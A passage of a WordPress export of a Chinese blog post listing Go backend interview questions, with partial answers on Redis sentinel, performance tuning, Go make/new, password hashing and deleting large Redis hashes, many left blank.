<pre><code class="">（有了解过一点，实际项目开发中没使用过）
Redis 的哨兵机制是解决主从同步无法在从服务器中选举出一个新的主服务器，以保证服务器的高可用。
哨兵会不断地检查主从服务器工作是否正常，哨兵每隔一秒就往主服务器、从服务器、其他哨兵进程发送一个 Ping 请求，如果超时没有回复则被标记成主观下线，如果一个主服务器被标记为主观下线，其他哨兵进程也会以每秒一次的频率发送 Ping 请求确定该主服务器是否进入了主观下线的状态。当超过判断阈值（quorum，一般为哨兵数量除二+1）的时候，主服务器即被标记为客观下线。然后开始选举一个哨兵来执行切换，负责主持的哨兵选出一个新的主服务器，发送 SLAVEOF NO ONE 命令让它转变成主服务器，然后让其他从服务器重写配置 slave of ，复制新主服务器的数据。
</code></pre>

<h5>24. golang 的 make 跟 new 有什么区别？</h5>

答：

<pre><code class="">make 只能作用于 slice、map、channel 三种类型的初始化，且返回的是这三个类型的引用，因为这三种类型本身就是引用类型。
new 用于类型的内存分配，并且分配零值。
make 返回的是三个引用类型本身；而 new 返回的是指向类型的指针。
</code></pre>

<h5>25. go 和 c 有哪些区别？</h5>

答：

<pre><code class="">（GC，指针）
</code></pre>

<h5>26. go 的 main 函数跟各个库的 init 执行顺序是怎么样的？</h5>

答：

<pre><code class="">init 函数先于 main 函数执行，且先从没有依赖的包开始初始化。
</code></pre>

<h5>27. MYSQL 主从复制是怎么样实现的？</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>28. MYSQL 有什么调优方法？</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>29. Linux 常用命令有哪些？</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>30. grep 命令的***参数是干嘛用的？</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>31. Linux 如何查看当前有哪些tcp连接</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>32. Linux 写出列出目录所有***开头名字的文件</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>33. Linux 写出列出目录所有修改时间在<em>到</em>的文件</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>34. 如何调试 MySQL 的死锁</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>35. 什么是 CAP 理论</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>36. 什么是惊群效应</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>37. 如何查看 Redis 中 Key 的内存占用大小？</h5>

答：

<pre><code class="">在 4.0.0 之前，可以使用 'redis-memory-for-key' 查看内存占用。4.0.0 之后新增了 'MEMORY USAGE key' 命令可以查看 key 内存占用字节数。
</code></pre>

<h5>38. Redis 的问题排查和性能优化</h5>

答：

<pre><code class="">- 优化建议
对于高并发的场景我们应该尽量避免在大对象上执行算法复杂度超过O(n)的命令。在使用redis的命令时需要密切注意文档中算法复杂度为O(n)的api。
Redis原生提供慢查询统计，执行slowlog get {n}命令可以获取最近n条慢查询命令。

- CPU饱和的问题
单线程的Redis处理命令时只能使用一个CPU，如果Redis把单核CPU使用率跑到接近100%，则会导致CPU饱和问题，这时Redis将无法处理更多的命令，严重影响吞吐量和系统的稳定性。
对于CPU饱和的问题，首先需要确认当前Redis的并发处理量是否达到极限，如果只有几百或几千qps的Redis实例其cpu使用率就达到饱和是不正常，这个时候需要排查是否是使用了高算法复杂度的命令，或者是否是对内存过度优化。如果qps确实很高，则需要考虑集群化水平扩展来分摊qps压力。

- 持久化相关的阻塞
对于开启了持久化功能的Redis节点，需要排查是否是持久化导致的阻塞。持久化引起的主线程阻塞的操作有：fork阻塞、AOF刷盘阻塞、HugePage写操作阻塞。

fork阻塞：fork操作发生在RDB和AOF重写时，Redis主线程调用fork操作产生共享内存的子进程，由子进程完成持久化文件重写工作，如果fork操作本身耗时很长，必然会导致主线程阻塞。

AOF刷盘阻塞：在开启AOF持久化功能时，文件刷盘一般采用一秒一次，后台线程每秒对AOF文件做fsync操作，当硬盘压力过大时，fsync操作需要等待，直到写入完成。如果主线程发现距离上一次的fsync成功超过2秒，为了数据安全性它会阻塞直到后台线程执行fsync操作完成。

子进程在执行重新期间利用linux写时复制技术降低内存开销，因此只有写操作时Redis才复制需要修改的内存页，对于开启Transparent HugePages的操作系统，每次写命令引起的复制内存页单位由4K变为2M，放大了512倍，会拖慢写操作的执行时间，导致大量写操作慢查询。
</code></pre>

<h5>39. Redis 性能测试</h5>

答：

<pre><code class="">redis-benchmark -n 1000 -t set,get -P 16 -q -c 1 -d  10
-n指定了请求总数， -P指定了pipeline模式的请求数， c指定了客户端个数 t指定了请求类型,-d指定了请求中value以字节为单位的大小
</code></pre>

<h5>40. BASE、CAP、ACID 分别是什么理论</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>41. Redis 事务和 Pipeline 的区别</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>42. 如何加密用户密码</h5>

答：

<pre><code class="">有，在开发中常用到的密码加密算法是 MD5、SHA256 和 bcrypt(Be kript) 摘要算法，MD5 和 SHA256都属于消息摘要算法；
MD5 算法具有不可逆性，任何长度的数据都会得出固定 32 位的摘要，MD5 常使用在明文密码加密的使用上.
只用 MD5 加密安全性依旧很低，在足够大的彩虹表面前 MD5 如同明文密码，一般都在明文密码的基础上添加盐值。
MD5 也大量使用在文件完整性校验中。

SHA256 算法和 MD5 一样具有不可逆性，任何长度的数据都会得出固定 64 位的摘要，在日常开发中常在 json web token 的签名中使用。
在生成加密密码的算法上，目前比较安全的加密算法是 bcrypt，每次生成的密码都不一样。
bcrypt 虽然速度较慢，但安全性也更高，使用 golang 的 bcrypt 测试加密速度，当 cost 设置为 7 ~ 10 的时候生成速度在可接受访问内(10ms ~ 100ms)。
</code></pre>

<h5>43. Redis 如何删除一个有 500 万个 key 的 hash</h5>

答：

<pre><code class="">在 Redis 2.8 之前，可以先把 hash rename 掉，然后使用 HSCAN 在后台每次获取一部分元素，再用 HDEL 删除，重复多次直到 hash 被清空。
但从 Redis 4.0 版本之后，支持 lazy free 方式来删除，可以使用 unlink 命令来进行，Redis 会把这个大键转移到 redis 的 bio 服务删除。
</code></pre>

<h5>TODO:</h5>

<ul>
<li>kafka\RabbitMQ\PostgreSQL\MongoDB</li>
<li>分布式事务\分布式锁</li>
<li>TCP\UDP\HTTP\HTTPS\QUIC</li>
</ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4138</wp:post_id>
		<wp:post_date><![CDATA[2019-06-24 22:21:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-06-24 14:21:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[go-%e9%9d%a2%e8%af%95%e9%a2%98]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
				</channel>
</rss>
	